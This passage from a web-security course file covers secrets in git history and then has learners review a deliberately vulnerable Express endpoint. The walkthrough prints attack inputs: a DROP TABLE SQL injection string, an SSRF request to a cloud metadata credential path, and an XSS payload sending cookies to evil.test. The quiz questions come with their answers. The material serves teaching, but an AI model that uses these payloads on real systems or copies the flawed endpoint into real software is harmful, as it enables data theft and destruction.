──────────────────────────   ─────────────────────────────────────
Lockfiles committed          Builds resolve to identical versions
Automated dependency         Known vulnerabilities surface as PRs
  scanning in CI             rather than at audit time
SBOM generated per release   You can answer "are we affected?" in
                             minutes when the next advisory lands
Pin CI action versions       A compromised tag cannot silently
  by commit SHA              change what runs in your pipeline`,
              "text",
              "The value of an SBOM appears entirely on the day of a major advisory.",
            ),
            text(
              "**Secrets in source control** remain one of the most common serious findings, and the reason is a misunderstanding about git. Deleting a secret in a later commit does not remove it — history retains it, and anyone with a clone has it. The only correct response to a committed credential is to **rotate it**, treating it as compromised.\n\nThat holds even for a private repository, because clones, forks, CI logs and backups all propagate history beyond the repository itself.",
            ),
            callout(
              "danger",
              "Secrets leak through more than repositories",
              "CI job logs that echo an environment, error messages returned to users, client-side bundles containing an API key, and container images with a build-time secret baked into a layer. Scan for credentials in all of these, not just in the source tree.",
            ),
            check(
              "An API key was committed three months ago and removed in a later commit. What is the correct response now?",
              [
                "Nothing further — the key is no longer in the current code",
                "Rotate the key, because git history and every existing clone still contain it",
                "Rewrite git history and consider the matter closed",
                "Make the repository private and leave the key in place",
              ],
              1,
              "The commit is still reachable in history, in every clone, and possibly in CI logs and forks. Rewriting history helps a little but cannot reach copies you do not control, so the only reliable action is to assume the key is public and rotate it.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Final Assessment: Web Security",
      description: "Diagnose a vulnerable app.",
      lessons: [
        lesson(
          "Applied Review",
          "Review one endpoint the way a security reviewer would and find every flaw in it.",
          9,
          [
            text(
              "One endpoint, several flaws. Read it carefully before continuing and list what you would raise — including the severity you would assign each, because a review that flags everything equally is not much use to the team receiving it.",
            ),
            code(
              `app.post("/api/documents/:id/share", requireLogin, async (req, res) => {
  const doc = await db.document.findUnique({
    where: { id: req.params.id },
  });

  const recipient = req.body.email;
  await db.$queryRawUnsafe(
    \`INSERT INTO shares (doc_id, email, permission)
     VALUES ('\${doc.id}', '\${recipient}', '\${req.body.permission}')\`
  );

  const preview = await fetch(req.body.callbackUrl);

  res.send(\`<p>Shared <b>\${doc.title}</b> with \${recipient}</p>\`);
});`,
              "javascript",
              "Authenticated endpoint. How many distinct vulnerabilities?",
            ),
            walkthrough(
              "Reviewing one endpoint properly",
              "Work through it in the order data flows: what is fetched, what is trusted, what is written, what is returned. Four separate issues, and they are not equally severe.",
              [
                step(
                  "Missing authorisation on the document lookup",
                  "The endpoint requires login and never checks that the logged-in user owns the document. Any authenticated user can share any document by supplying its id — including to themselves.",
                  {
                    evidence: {
                      label: "The lookup, and the fix",
                      code: `// vulnerable — any id, any user
where: { id: req.params.id }

// scoped to the caller
const doc = await db.document.findFirst({
  where: { id: req.params.id, ownerId: req.user.id },
});
if (!doc) return res.status(404).end();`,
                    },
                    insight: "Highest severity of the four. It grants access to every document in the system and leaves no anomaly in the logs, because every request is properly authenticated.",
                  },
                ),
                step(
                  "SQL injection through raw interpolation",
                  "Three values are interpolated into a raw query, two of them straight from the request body. The application uses an ORM everywhere else, which is exactly how this kind of thing survives review.",
                  {
                    evidence: {
                      label: "The injectable path",
                      code: `permission = "read'); DROP TABLE shares; --"

INSERT INTO shares (doc_id, email, permission)
VALUES ('4021', 'a@b.c', 'read'); DROP TABLE shares; --')`,
                    },
                    insight: "Fix by using the ORM's create, or a parameterised query. Note that being on an ORM protected nothing here — safety comes from how the input is bound, not from the library.",
                  },
                ),
                step(
                  "Server-side request forgery on the callback",
                  "A URL from the request body is fetched by the server with no validation. In a cloud environment this reaches the metadata endpoint and returns role credentials.",
                  {
                    evidence: {
                      label: "What an attacker sends",
                      code: `callbackUrl = "http://169.254.169.254/latest/meta-data/
                iam/security-credentials/app-role"`,
                    },
                    insight: "The response is never returned to the user here, but blind SSRF is still exploitable — and if the fetch result were rendered, this would be immediate credential disclosure.",
                  },
                ),
                step(
                  "Cross-site scripting in the response",
                  "The recipient email and document title are interpolated into an HTML response without encoding. The email comes directly from the request body and is never validated.",
                  {
                    evidence: {
                      label: "Reflected payload",
                      code: `email = "<img src=x onerror=fetch('https://evil.test/'+document.cookie)>"

res.send(\`<p>Shared <b>...</b> with <img src=x onerror=...></p>\`)`,
                    },
                    insight: "Lowest severity of the four, since it needs the victim to trigger the request. Still worth fixing by returning JSON and letting the client render, or by encoding on output.",
                  },
                ),
                step(
                  "Write the review so it can be acted on",
                  "Order by severity with the fix alongside each: missing authorisation (critical, scope the query), SQL injection (critical, parameterise), SSRF (high, allow-list plus network egress control), XSS (medium, return JSON). Note the pattern too — every one of these is user input being trusted at a different layer.",
                  {
                    insight: "The pattern observation is often the most valuable part of a review. Four bugs in one endpoint suggests the codebase lacks a shared safe path, which is a design conversation rather than four tickets.",
                  },
                ),
              ],
            ),
            check(
              "Which flaw in this endpoint is most severe, and why?",
              [
                "The XSS, because it executes in a victim's browser",
                "The missing ownership check, because any authenticated user can reach any document and it leaves no trace in the logs",
                "The SSRF, because it is hardest to remediate",
                "The SQL injection, because it could drop a table",
              ],
              1,
              "SQL injection is comparably severe and requires a crafted payload; the authorisation gap needs nothing but a different id, works for every document, and produces requests that look entirely legitimate. Exploitability with no anomaly is what pushes it to the top.",
            ),
          ],
        ),
      ],
    },
  ],
};
